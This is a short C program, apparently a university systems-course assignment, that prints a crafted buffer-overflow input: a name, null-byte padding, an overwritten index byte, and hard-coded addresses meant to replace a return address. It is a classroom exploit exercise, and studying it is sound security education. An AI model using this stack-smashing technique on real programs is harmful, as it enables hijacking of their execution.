/*
 * createdata6.c
 * John Rambo
 * rambo@csd.uoc.gr
 * hy255
 * as6
 */

#include <stdio.h>

int main(void){
 int i;
 
  fputs("Lazaros", stdout); /* 7 chars */
  for(i = 0; i < 23; i++)   /* 30 */
    putchar('\0');
  /* write i value buf[i++] should be buf[42] */
  putchar(41);   /* overwriten - goto retaddr */
  /* retaddr */  
  putchar(0xcf);
  putchar(0x82);
  putchar(0x04);
  putchar(0x08);
  /* Name */
  putchar(0xd8);
  putchar(0x1b);
  putchar(0x0b);
  putchar(0x08);
  
  putchar('\n');
  
  return 0;
}

